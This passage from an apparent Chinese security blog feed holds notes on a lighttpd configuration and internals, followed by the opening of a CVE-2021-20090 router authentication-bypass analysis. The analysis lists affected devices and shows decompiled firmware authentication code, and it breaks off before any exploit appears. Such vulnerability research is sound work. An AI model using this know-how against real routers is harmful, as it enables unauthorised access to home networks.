class="hljs-string">&quot;bin-path&quot;</span> =&gt; <span class="hljs-string">&quot;/usr/local/bin/php&quot;</span></span><br><span class="hljs-meta">#)</span><br><span class="hljs-meta">#)</span><br><span class="hljs-meta">#)</span><br><br><span class="hljs-meta">#### CGI module</span><br><span class="hljs-meta">#cgi.assign = ( <span class="hljs-string">&quot;.pl&quot;</span>  =&gt; <span class="hljs-string">&quot;/usr/bin/perl&quot;</span>, <span class="hljs-string">&quot;.cgi&quot;</span> =&gt; <span class="hljs-string">&quot;/usr/bin/perl&quot;</span> )</span><br><br><span class="hljs-meta">#### SSL engine</span><br>$SERVER[<span class="hljs-string">&quot;socket&quot;</span>] == <span class="hljs-string">&quot;:18443&quot;</span> &#123;<br>server.document-root = var.VendorPath+<span class="hljs-string">&quot;/www/&quot;</span><br>ssl.engine = <span class="hljs-string">&quot;enable&quot;</span><br>ssl.pemfile = <span class="hljs-string">&quot;/etc/lighttpd/lighttpd.pem&quot;</span><br>&#125;<br><br><span class="hljs-meta">#### status module</span><br><span class="hljs-meta">#status.status-url = <span class="hljs-string">&quot;/server-status&quot;</span></span><br><span class="hljs-meta">#status.config-url = <span class="hljs-string">&quot;/server-config&quot;</span></span><br><br><span class="hljs-meta">#### usertrack module</span><br>usertrack.cookie-max-age = <span class="hljs-number">3600</span><br>usertrack.cookie-name = <span class="hljs-string">&quot;ugwcookie&quot;</span><br>usertrack.cookie-attrs = <span class="hljs-string">&quot;; Secure; HttpOnly&quot;</span><br><br><span class="hljs-meta">#### auth module</span><br>$HTTP[<span class="hljs-string">&quot;url&quot;</span>] =~ <span class="hljs-string">&quot;&quot;</span> &#123;<br>auth.backend = <span class="hljs-string">&quot;htdigest&quot;</span><br>auth.backend.htdigest.userfile = <span class="hljs-string">&quot;/etc/lighttpd/lighttpdadmin.user&quot;</span><br>        auth.require = (<br>               <span class="hljs-string">&quot;&quot;</span> =&gt; (<br>                      <span class="hljs-string">&quot;method&quot;</span>  =&gt; <span class="hljs-string">&quot;digest&quot;</span>,<br>                      <span class="hljs-string">&quot;realm&quot;</span>   =&gt; <span class="hljs-string">&quot;auth&quot;</span>,<br>                      <span class="hljs-string">&quot;require&quot;</span> =&gt; <span class="hljs-string">&quot;valid-user&quot;</span><br>        )<br>       )<br>&#125;<br>                                                                                                                                        <br><span class="hljs-meta">#$HTTP[<span class="hljs-string">&quot;url&quot;</span>] =~ <span class="hljs-string">&quot;^/gu/&quot;</span> &#123;</span><br><span class="hljs-meta">#auth.backend = <span class="hljs-string">&quot;htdigest&quot;</span></span><br><span class="hljs-meta">#auth.backend.htdigest.userfile = <span class="hljs-string">&quot;/etc/lighttpd/lighttpdguest.user&quot;</span></span><br><span class="hljs-meta">#        auth.require = (</span><br><span class="hljs-meta">#        <span class="hljs-string">&quot;&quot;</span> =&gt; (</span><br><span class="hljs-meta">#                      <span class="hljs-string">&quot;method&quot;</span>  =&gt; <span class="hljs-string">&quot;digest&quot;</span>,</span><br><span class="hljs-meta">#                      <span class="hljs-string">&quot;realm&quot;</span>   =&gt; <span class="hljs-string">&quot;auth&quot;</span>,</span><br><span class="hljs-meta">#                      <span class="hljs-string">&quot;require&quot;</span> =&gt; <span class="hljs-string">&quot;valid-user&quot;</span></span><br><span class="hljs-meta">#        )</span><br><span class="hljs-meta">#        )</span><br><span class="hljs-meta">#&#125;</span><br>                                                                                                       <br><span class="hljs-meta">#$HTTP[<span class="hljs-string">&quot;url&quot;</span>] =~ <span class="hljs-string">&quot;^/usr/&quot;</span> &#123;</span><br><span class="hljs-meta">#auth.backend = <span class="hljs-string">&quot;htdigest&quot;</span></span><br><span class="hljs-meta">#auth.backend.htdigest.userfile = <span class="hljs-string">&quot;/etc/lighttpd/lighttpduser.user&quot;</span></span><br><span class="hljs-meta">#        auth.require = (</span><br><span class="hljs-meta">#               <span class="hljs-string">&quot;&quot;</span> =&gt; (</span><br><span class="hljs-meta">#                      <span class="hljs-string">&quot;method&quot;</span>  =&gt; <span class="hljs-string">&quot;digest&quot;</span>,</span><br><span class="hljs-meta">#                      <span class="hljs-string">&quot;realm&quot;</span>   =&gt; <span class="hljs-string">&quot;auth&quot;</span>,</span><br><span class="hljs-meta">#                      <span class="hljs-string">&quot;require&quot;</span> =&gt; <span class="hljs-string">&quot;valid-user&quot;</span></span><br><span class="hljs-meta">#               )</span><br><span class="hljs-meta">#       )</span><br><span class="hljs-meta">#&#125;</span><br><br><span class="hljs-meta">#$HTTP[<span class="hljs-string">&quot;url&quot;</span>] =~ <span class="hljs-string">&quot;^/adm/&quot;</span> &#123;</span><br><span class="hljs-meta">#auth.backend = <span class="hljs-string">&quot;htdigest&quot;</span></span><br><span class="hljs-meta">#auth.backend.htdigest.userfile = <span class="hljs-string">&quot;/etc/lighttpd/lighttpdadmin.user&quot;</span></span><br><span class="hljs-meta">#        auth.require = (</span><br><span class="hljs-meta">#               <span class="hljs-string">&quot;&quot;</span> =&gt; (</span><br><span class="hljs-meta">#                      <span class="hljs-string">&quot;method&quot;</span>  =&gt; <span class="hljs-string">&quot;digest&quot;</span>,</span><br><span class="hljs-meta">#                      <span class="hljs-string">&quot;realm&quot;</span>   =&gt; <span class="hljs-string">&quot;auth&quot;</span>,</span><br><span class="hljs-meta">#                      <span class="hljs-string">&quot;require&quot;</span> =&gt; <span class="hljs-string">&quot;valid-user&quot;</span></span><br><span class="hljs-meta">#               )</span><br><span class="hljs-meta">#        )</span><br><span class="hljs-meta">#&#125;</span><br>                                                                                                                                        <br>$HTTP[<span class="hljs-string">&quot;url&quot;</span>] =~ <span class="hljs-string">&quot;^/su/&quot;</span> &#123;<br>auth.backend = <span class="hljs-string">&quot;htdigest&quot;</span><br>auth.backend.htdigest.userfile = <span class="hljs-string">&quot;/etc/lighttpd/lighttpdsuper.user&quot;</span><br>        auth.require = (<br>               <span class="hljs-string">&quot;&quot;</span> =&gt; (<br>                      <span class="hljs-string">&quot;method&quot;</span>  =&gt; <span class="hljs-string">&quot;digest&quot;</span>,<br>                      <span class="hljs-string">&quot;realm&quot;</span>   =&gt; <span class="hljs-string">&quot;auth&quot;</span>,<br>                      <span class="hljs-string">&quot;require&quot;</span> =&gt; <span class="hljs-string">&quot;valid-user&quot;</span><br>        )<br>       )<br>&#125;<br><br><span class="hljs-meta">## read authentification.txt for more info</span><br><span class="hljs-meta">#auth.backend = <span class="hljs-string">&quot;plain&quot;</span></span><br><span class="hljs-meta">#auth.backend.plain.userfile = <span class="hljs-string">&quot;lighttpd.user&quot;</span></span><br><span class="hljs-meta">#auth.backend.plain.groupfile = <span class="hljs-string">&quot;lighttpd.group&quot;</span></span><br><span class="hljs-meta">#auth.require = (</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;/server-status&quot;</span> =&gt; ( </span><br><span class="hljs-meta">#<span class="hljs-string">&quot;method&quot;</span>  =&gt; <span class="hljs-string">&quot;digest&quot;</span>,</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;realm&quot;</span>   =&gt; <span class="hljs-string">&quot;download archiv&quot;</span>,</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;require&quot;</span> =&gt; <span class="hljs-string">&quot;group=www|user=jan|host=192.168.2.10&quot;</span></span><br><span class="hljs-meta">#),</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;/server-info&quot;</span> =&gt; ( </span><br><span class="hljs-meta">#<span class="hljs-string">&quot;method&quot;</span>  =&gt; <span class="hljs-string">&quot;digest&quot;</span>,</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;realm&quot;</span>   =&gt; <span class="hljs-string">&quot;download archiv&quot;</span>,</span><br><span class="hljs-meta">#<span class="hljs-string">&quot;require&quot;</span> =&gt; <span class="hljs-string">&quot;group=www|user=jan|host=192.168.2.10&quot;</span></span><br><span class="hljs-meta">#)</span><br><span class="hljs-meta">#)</span><br><br><span class="hljs-meta">#### url handling modules (rewrite, redirect, access)</span><br><span class="hljs-meta">#url.redirect = ( <span class="hljs-string">&quot;^/$&quot;</span> =&gt; <span class="hljs-string">&quot;/app/&quot;</span> )</span><br><span class="hljs-meta">#url.redirect = ( <span class="hljs-string">&quot;^/wishlist/(.+)&quot;</span> =&gt; <span class="hljs-string">&quot;http://www.123.org/$1&quot;</span> )</span><br><br><span class="hljs-meta">#### both rewrite/redirect support back reference to regex conditional using %n</span><br><span class="hljs-meta">#$HTTP[<span class="hljs-string">&quot;host&quot;</span>] =~ <span class="hljs-string">&quot;^/$&quot;</span> &#123;</span><br><span class="hljs-meta">#url.redirect = ( <span class="hljs-string">&quot;^/$&quot;</span> =&gt; <span class="hljs-string">&quot;http://%1/app/&quot;</span> )</span><br><span class="hljs-meta">#&#125;</span><br><br><span class="hljs-meta">#### expire module</span><br><span class="hljs-meta">#expire.url = ( <span class="hljs-string">&quot;/buggy/&quot;</span> =&gt; <span class="hljs-string">&quot;access 2 hours&quot;</span>, <span class="hljs-string">&quot;/asdhas/&quot;</span> =&gt; <span class="hljs-string">&quot;access plus 1 seconds 2 minutes&quot;</span>)</span><br><br><span class="hljs-meta">#### ssi</span><br><span class="hljs-meta">#ssi.extension = ( <span class="hljs-string">&quot;.shtml&quot;</span> )</span><br><br><span class="hljs-meta">#### setenv</span><br><span class="hljs-meta">#setenv.add-request-header  = ( <span class="hljs-string">&quot;TRAV_ENV&quot;</span> =&gt; <span class="hljs-string">&quot;mysql://user@host/db&quot;</span> )</span><br><span class="hljs-meta">#setenv.add-response-header = ( <span class="hljs-string">&quot;X-Secret-Message&quot;</span> =&gt; <span class="hljs-string">&quot;42&quot;</span> )</span><br><br><span class="hljs-meta">#### variable usage:</span><br><span class="hljs-meta">## variable name without <span class="hljs-string">&quot;.&quot;</span> is auto prefixed by <span class="hljs-string">&quot;var.&quot;</span> and becomes <span class="hljs-string">&quot;var.bar&quot;</span></span><br><span class="hljs-meta">#bar = 1</span><br><span class="hljs-meta">#var.mystring = <span class="hljs-string">&quot;foo&quot;</span></span><br><br><span class="hljs-meta">## integer add</span><br><span class="hljs-meta">#bar += 1</span><br><span class="hljs-meta">## string concat, with integer cast as string, result: <span class="hljs-string">&quot;www.foo1.com&quot;</span></span><br><span class="hljs-meta">#server.name = <span class="hljs-string">&quot;www.&quot;</span> + mystring + var.bar + <span class="hljs-string">&quot;.com&quot;</span></span><br><span class="hljs-meta">## array merge</span><br><span class="hljs-meta">#index-file.names = (foo + <span class="hljs-string">&quot;.php&quot;</span>) + index-file.names</span><br><span class="hljs-meta">#index-file.names += (foo + <span class="hljs-string">&quot;.php&quot;</span>)</span><br><br><span class="hljs-meta">#### <span class="hljs-keyword">include</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> /etc/lighttpd/lighttpd-inc.conf</span><br><span class="hljs-meta">## same as above if you run: <span class="hljs-string">&quot;lighttpd -f /etc/lighttpd/lighttpd.conf&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lighttpd-inc.conf&quot;</span></span><br><br><span class="hljs-meta">#### include_shell</span><br><span class="hljs-meta">#include_shell <span class="hljs-string">&quot;echo var.a=1&quot;</span></span><br><span class="hljs-meta">## the above is same as:</span><br><span class="hljs-meta">#var.a=1</span><br><br><span class="hljs-meta">#### webdav</span><br><span class="hljs-meta">#$HTTP[<span class="hljs-string">&quot;url&quot;</span>] =~ <span class="hljs-string">&quot;^/webdav($|/)&quot;</span> &#123;</span><br><span class="hljs-meta"># webdav.activate = <span class="hljs-string">&quot;enable&quot;</span></span><br><span class="hljs-meta"># webdav.is-readonly = <span class="hljs-string">&quot;enable&quot;</span></span><br><span class="hljs-meta"># webdav.sqlite-db-name = <span class="hljs-string">&quot;/var/run/lighttpd-webdav-lock.db&quot;</span></span><br><span class="hljs-meta">#&#125;</span><br><br><span class="hljs-meta">#### setenv module</span><br><br>setenv.add-response-header = (<br><span class="hljs-meta"># don<span class="hljs-string">&#x27;t allow external content at all </span></span><br><span class="hljs-string"><span class="hljs-meta">&quot;Content-Security-Policy&quot; =&gt; &quot;script-src &#x27;</span>self<span class="hljs-string">&#x27;  &#x27;</span>unsafe-eval<span class="hljs-string">&#x27; &#x27;</span>unsafe-inline<span class="hljs-string">&#x27; ;&quot;,</span></span><br><span class="hljs-string"><span class="hljs-meta">#don&#x27;</span>t allow anyone to change the content type</span><br><span class="hljs-string">&quot;Content-Type-Options&quot;</span> =&gt; <span class="hljs-string">&quot;nosniff&quot;</span>,<br><span class="hljs-meta">#prevent any communications from being sent over HTTP to the specified domain</span><br><span class="hljs-string">&quot;Strict-Transport-Security&quot;</span> =&gt; <span class="hljs-string">&quot;max-age=31536000;includeSubDomains&quot;</span>,<br><span class="hljs-meta">#stop pages from loading when reflected XSS attacks detected</span><br><span class="hljs-string">&quot;X-XSS-Protection&quot;</span> =&gt; <span class="hljs-string">&quot;1;mode=block&quot;</span>,<br><span class="hljs-meta">#browser should allow rendering of frame of its in the same origin as the page itself</span><br><span class="hljs-string">&quot;X-Frame-Options&quot;</span> =&gt; <span class="hljs-string">&quot;SAMEORIGIN&quot;</span>,<br><span class="hljs-meta">#not to use a previously cached response, not to store the response, the cache must be revalidated on the origin server.</span><br><span class="hljs-string">&quot;Cache-Control&quot;</span> =&gt; <span class="hljs-string">&quot;no-cache,no-store,max-age=0,must-revalidate&quot;</span>,<br><span class="hljs-string">&quot;Pragma&quot;</span> =&gt; <span class="hljs-string">&quot;no-cache&quot;</span>,<br><span class="hljs-string">&quot;Expires&quot;</span> =&gt; <span class="hljs-string">&quot;-1&quot;</span><br>)<br></code></pre></td></tr></table></figure><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p> 整个程序的入口（main函数）在server.c文件中。</p><p><strong>fdevent 系统</strong></p><p>lighttpd中的fdevent系统。fdevent系统主要是处理各种IO事件，在web服务器中，主要就是向socket写数据和从socket读数据。通常，web服务器是IO密集型程序，这就要求在数据的读写上，web服务器必须能够具有很好的性能，不会因为某个socket的阻塞而致使其他socket也被阻塞，否则会大大降低服务器的性能。因此，大部分的web服务器都采用非阻塞IO进行数据的读写。lighttpd通过fdevent系统，采用类似OO中面向对象的方式将对IO事件的处理进行封装，对于不同的IO系统，提供一个统一的接口。<br>lighttpd采用了所谓的Reactor模式，也就是非阻塞IO加多路复用（non-blocking IO + IO multiplexing）。在多路复用上，lighttpd通过fdevent将各种不同的实现进行封装</p><p><img src="https://pic002.cnblogs.com/img/kernelhcy/201003/2010031717255347.png" alt="img"></p><p><strong>状态机处理</strong></p><p>（1）connection.c 文件中的函数说明</p><p>connection_handle_read_state(server *srv，connection *con) </p><p>在这个函数中，如果数据读取完毕或出错，那么进入相应的状态，如果数据没有读取完毕那么连接的状态不变。此函数读取的数据是HTTP头，在这个函数中根据格式HTTP头的格式判断HTTP头是否已经读取完毕，包括POST数据。</p><p>connection_set_state()函数</p><p>此函数可以将新建立的连接的状态设置为其他的状态。</p><p>http_response_prepare 函数中，</p><p>通过对url 的解析，逐步调用插件来处理，对解析的uri 的结果存放在 con -&gt; uri 中。</p><p><strong>插件接口</strong></p><p>plugins_call_handle_uri_raw</p><p>在得到http头中，request line的url地址直接调用，此时url地址没有解码</p><p>plugins_call_handle_uri_clean</p><p>对url 地址进行解码之后调用</p><p>plugins_call_handle_docroot</p><p>设置处理请求时的根目录</p><p>plugins_call_handle_physical</p><p>得到请求资源在服务器上的物理地址，根据这个物理地址做相应的处理</p><p>plugins_call_handle_subrequest_start</p><p>子请求处理开始</p><p>plugins_call_handle_subrequest</p><p>处理子请求</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/kernel_hcy/archive/2010/04/07/1706587.html">https://www.cnblogs.com/kernel_hcy/archive/2010/04/07/1706587.html</a> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-20090 身份验证绕过漏洞分析</title>
    <link href="/2023/12/16/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2023/12/16/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近Tenable 披露了Arcadyna 网络设备身份验证绕过漏洞，并且很多的厂商都采用产生漏洞的组件，由于Arcadyan 设备固件厂商并没有开源出来，在官网支持里面下载的文件是window和linux 下和设备连接的客户端软件，无法对漏洞点开展分析，这里我们使用同样受影响的华硕产品DSL-AC3100 的固件来进行设备分析。并且复现在网络设备中网络检测ping 功能的远程命令执行漏洞，从而开启设备telentd。</p><p>影响范围</p><p>ADB ADSL wireless IAD router 1.26S-R-3P<br>Arcadyan ARV7519 00.96.00.96.617ES<br>Arcadyan VRV9517 6.00.17 build04<br>Arcadyan VGV7519 3.01.116<br>Arcadyan VRV9518 1.01.00 build44<br>ASMAX BBR-4MG &#x2F; SMC7908 ADSL 0.08<br>ASUS DSL-AC88U (Arc VRV9517) 1.10.05 build502<br>ASUS DSL-AC87VG (Arc VRV9510) 1.05.18 build305<br>ASUS DSL-AC3100 1.10.05 build503<br>ASUS DSL-AC68VG 5.00.08 build272<br>Beeline Smart Box Flash 1.00.13_beta4<br>British Telecom WE410443-SA 1.02.12 build02<br>Buffalo WSR-2533DHPL2 1.02<br>Buffalo WSR-2533DHP3 1.24<br>Buffalo BBR-4HG 　<br>Buffalo BBR-4MG 2.08 Release 0002<br>Buffalo WSR-3200AX4S 1.1<br>Buffalo WSR-1166DHP2 1.15<br>Buffalo WXR-5700AX7S 1.11<br>Deutsche Telekom Speedport Smart 3 010137.4.8.001.0<br>HughesNet HT2000W 0.10.10<br>KPN ExperiaBox V10A (Arcadyan VRV9517) 5.00.48 build453<br>KPN VGV7519 3.01.116<br>O2 HomeBox 6441 1.01.36<br>Orange LiveBox Fibra (PRV3399) 00.96.00.96.617ES<br>Skinny Smart Modem (Arcadyan VRV9517) 6.00.16 build01<br>SparkNZ Smart Modem (Arcadyan VRV9517) 6.00.17 build04<br>Telecom (Argentina) Arcadyan VRV9518VAC23-A-OS-AM 1.01.00 build44<br>TelMex PRV33AC 1.31.005.0012<br>TelMex VRV7006 　<br>Telstra Smart Modem Gen 2 (LH1000) 0.13.01r<br>Telus WiFi Hub (PRV65B444A-S-TS) v3.00.20<br>Telus NH20A 1.00.10debug build06<br>Verizon Fios G3100 1.5.0.10<br>Vodafone EasyBox 904 4.16<br>Vodafone EasyBox 903 30.05.714<br>Vodafone EasyBox 802 20.02.226</p><h2 id="0x02-华硕DSL-AC3100-固件"><a href="#0x02-华硕DSL-AC3100-固件" class="headerlink" title="0x02 华硕DSL-AC3100 固件"></a>0x02 华硕DSL-AC3100 固件</h2><p>我们从华硕的官网中下载固件。</p><p>设备名称： DSL-AC3100</p><p>固件版本： DSL-AC3100_v1.10.05_build503</p><h2 id="0x03-身份验证绕过漏洞分析"><a href="#0x03-身份验证绕过漏洞分析" class="headerlink" title="0x03 身份验证绕过漏洞分析"></a>0x03 身份验证绕过漏洞分析</h2><h4 id="提取固件包"><a href="#提取固件包" class="headerlink" title="提取固件包"></a>提取固件包</h4><p>从华硕的官网瞎下载到固件包DSL-AC3100_v1.10.05_build503.w ，这是一个是用.w 为后缀的固件文件，使用binwalk 可以提取出来。根据漏洞信息，可以确定这是一个在http服务中存在的漏洞，可以确定到httpd 文件，本固件的httpd 文件在 &#x2F;usr&#x2F;sbin&#x2F;httpd 中。</p><p><img src="/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210815164522715.png" alt="image-20210815164522715"></p><h4 id="httpd-二进制文件分析"><a href="#httpd-二进制文件分析" class="headerlink" title="httpd 二进制文件分析"></a>httpd 二进制文件分析</h4><p>在ghidra 导入httpd 文件，自动对文件进行分析，识别文件的各种函数。</p><p>由于漏洞是身份认证绕过漏洞，因此首先要确定设备的身份验证相关的函数有哪些，在ghidra对httpd文件中的字符串进行搜寻，根据字符串 “check_auth” ，定位到函数 FUN_0001d0c0()，</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs perl">undefined4 FUN_0001d0c<span class="hljs-number">0</span>(<span class="hljs-keyword">int</span> iParm1)<br><br>&#123;<br>  <span class="hljs-keyword">int</span> iVar1;<br>  undefined4 uVar2;<br>  <span class="hljs-keyword">int</span> iVar3;<br>  undefined4 local_52c;<br>  undefined4 local_528;<br>  undefined4 local_524;<br>  undefined4 uStack1312;<br>  undefined4 local_51c;<br>  char acStack1304 [<span class="hljs-number">1024</span>];<br>  char acStack28<span class="hljs-number">0</span> [<span class="hljs-number">260</span>];<br>  <br>  memset(acStack28<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>);<br>  memset(acStack1304,<span class="hljs-number">0</span>,<span class="hljs-number">0x400</span>);<br>  local_52c = <span class="hljs-number">0</span>;<br>  local_528 = <span class="hljs-number">0</span>;<br>  local_524 = <span class="hljs-number">0</span>;<br>  uStack1312 = <span class="hljs-number">0</span>;<br>  local_51c = <span class="hljs-number">0</span>;<br>  iVar1 = FUN_00017df<span class="hljs-number">0</span>();<br>  <span class="hljs-keyword">if</span> (iVar1 == -<span class="hljs-number">1</span>) &#123;<br>    uVar2 = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    iVar3 = mapi_ccfg_match_str(iVar1,<span class="hljs-string">&quot;ARC_SYS_LogEnable&quot;</span>,&amp;DAT_00046b48);<br>    iVar1 = mapi_ccfg_match_str(iVar1,<span class="hljs-string">&quot;ARC_SYS_MPTEST&quot;</span>,&amp;DAT_00046b48);<br>    <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">if</span> (iVar3 != <span class="hljs-number">0</span>) &#123;<br>        iVar3 = <span class="hljs-number">1</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (iVar3 != <span class="hljs-number">0</span>) &#123;<br>        FUN_00017738(iParm1 + <span class="hljs-number">0x76f0</span>,&amp;local_52c);<br>      &#125;<br>      <span class="hljs-keyword">if</span> (*(<span class="hljs-keyword">int</span> *)(iParm1 + <span class="hljs-number">0x774c</span>) == <span class="hljs-number">0</span>) &#123;<br>        uVar2 = FUN_0001b6f4(iParm1 + <span class="hljs-number">0x771e</span>,*(undefined4 *)(iParm1 + <span class="hljs-number">0x76ec</span>));<br>        FUN_0001b8c8(iParm1,uVar2);<br>      &#125;<br>      iVar1 = FUN_0001ce8c(*(undefined4 *)(iParm1 + <span class="hljs-number">0x774c</span>),*(undefined4 *)(iParm1 + <span class="hljs-number">0x76b0</span>),<br>                           *(undefined4 *)(iParm1 + <span class="hljs-number">0x76b4</span>),*(undefined4 *)(iParm1 + <span class="hljs-number">0x76b8</span>),<br>                           *(undefined4 *)(iParm1 + <span class="hljs-number">0x76bc</span>),*(undefined4 *)(iParm1 + <span class="hljs-number">0x76c0</span>),<br>                           *(undefined4 *)(iParm1 + <span class="hljs-number">0x76c4</span>),*(undefined4 *)(iParm1 + <span class="hljs-number">0x76c8</span>),<br>                           *(undefined4 *)(iParm1 + <span class="hljs-number">0x7b34</span>));<br>      <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;[%s] %s login time out, reauth\n&quot;</span>,<span class="hljs-string">&quot;check_auth&quot;</span>,iParm1 + <span class="hljs-number">0x76f0</span>);<br>        FUN_00039088(<span class="hljs-number">1</span>);<br>        snprintf(acStack1304,<span class="hljs-number">0x400</span>,<span class="hljs-string">&quot;Location: /relogin.htm\n\n&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">2</span>) &#123;<br>          <span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;[%s] new user %s(%s) comes to login, check user and auth\n&quot;</span>,<span class="hljs-string">&quot;check_auth&quot;</span>,<br>                 iParm1 + <span class="hljs-number">0x76f0</span>,iParm1 + <span class="hljs-number">0x4c</span>);<br>          snprintf(acStack1304,<span class="hljs-number">0x400</span>,<span class="hljs-string">&quot;Location: /relogin.htm\n\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;[%s] %s has already granted, pass\n&quot;</span>,<span class="hljs-string">&quot;check_auth&quot;</span>,iParm1 + <span class="hljs-number">0x76f0</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          &#125;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (iVar3 != <span class="hljs-number">0</span>) &#123;<br>        snprintf(acStack28<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">&quot;User from %s(%s) authentication fail.&quot;</span>,&amp;local_52c,iParm1 +<span class="hljs-number">0x76f0</span><br>                );<br>        append_to_file(<span class="hljs-string">&quot;/tmp/security_log.txt&quot;</span>,acStack28<span class="hljs-number">0</span>);<br>      &#125;<br>      FUN_00015338(iParm1,acStack1304);<br>      uVar2 = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      uVar2 = <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> uVar2;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据函数代码的一些细节，可以看出这个函数检查认认证是否符合的功能函数，其中FUN_0001ce8c 函数的返回值iVar1，在函数中 iVar1 的值为2 时，说明是新用户登录，需要检查用户名和验证。iVar1 的值为 0 的时候，则显示验证通过。iVar1 的值为 1 的时候，则表示说明验证超时，并且重新返回到登录界面。</p><p>接下来，查看FUN_0001d0c0() 函数在FUN_0001d578() 中被引用。而FUN_0001d0c0() 函数就是漏洞的evaluate_access() 函数。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">// evaluate_access()</span><br><span class="hljs-function">undefined4 <span class="hljs-title">FUN_0001d578</span><span class="hljs-params">(undefined4 uParm1,undefined4 uParm2,<span class="hljs-type">int</span> iParm3)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  undefined4 uVar2;<br>  <br>  <span class="hljs-keyword">if</span> (iParm3 == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  iVar1 = <span class="hljs-built_in">FUN_0001d2e0</span>(iParm3);<br>  <span class="hljs-keyword">if</span> (iVar1 != <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)(iParm3 + <span class="hljs-number">0x76a8</span>) != <span class="hljs-number">0</span>) &#123;<br>      <span 